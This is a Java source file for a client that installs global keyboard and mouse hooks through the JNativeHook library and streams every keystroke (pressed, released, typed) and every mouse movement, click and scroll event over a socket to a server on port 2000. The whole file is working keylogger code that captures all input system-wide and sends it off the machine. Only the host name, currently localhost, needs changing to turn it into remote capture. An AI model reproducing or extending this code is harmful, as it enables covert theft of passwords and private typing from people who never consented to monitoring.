import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;
import org.jnativehook.mouse.NativeMouseWheelEvent;
import org.jnativehook.mouse.NativeMouseWheelListener;

import java.io.*;
import java.net.*;

public class Client implements NativeKeyListener, NativeMouseInputListener, NativeMouseWheelListener {
    private static FileWriter filewriter;
    private static BufferedWriter bufferedWriter;
    private static ObjectOutputStream objectOutputStream;

    public static void main(String[] args) throws NativeHookException, IOException {
        Socket socket = new Socket("localhost", 2000);
        objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(new Client());
        GlobalScreen.addNativeMouseListener(new Client());
        GlobalScreen.addNativeMouseMotionListener(new Client());
        GlobalScreen.addNativeMouseWheelListener(new Client());
    }

    //native event listeners
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        try {
            objectOutputStream.writeUTF("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        } catch (IOException f) {
            System.out.println(f);
        }
    }

    /*
    This method records all the pressed keys
    */
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            objectOutputStream.writeUTF("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        } catch (IOException f) {
            System.out.println(f);
        }

    }

    //qwerrty
 /*
 This method records all the released keys
 */
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        try {
            objectOutputStream.writeUTF("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        } catch (IOException f) {
            System.out.println(f);
        }

    }

    @Override
    public void nativeMouseClicked(NativeMouseEvent nativeMouseEvent) {
    }

    /*
    This method records all the mouse clicks
    */
    @Override
    public void nativeMousePressed(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Pressed");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /*
    This method records all the mouse button released events
    */
    @Override
    public void nativeMouseReleased(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Released");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /*
    This method records all the mouse move coordinates
    */
    @Override
    public void nativeMouseMoved(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Moved to: " + nativeMouseEvent.getX() + ", " + nativeMouseEvent.getY());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /*
    This method records all the mouse dragged coordinates
    */
    @Override
    public void nativeMouseDragged(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Dragged to: " + nativeMouseEvent.getX() + ", " + nativeMouseEvent.getY());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /* This method records all the mouse wheel moves, direction of the move and scroll amount lol
     */
    @Override
    public void nativeMouseWheelMoved(NativeMouseWheelEvent nativeMouseWheelEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Wheel Moved: " + nativeMouseWheelEvent.getWheelRotation());
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            objectOutputStream.writeUTF("Scroll Amount: " + nativeMouseWheelEvent.getScrollAmount());
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            objectOutputStream.writeUTF("Wheel Direction: " + nativeMouseWheelEvent.getWheelDirection());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}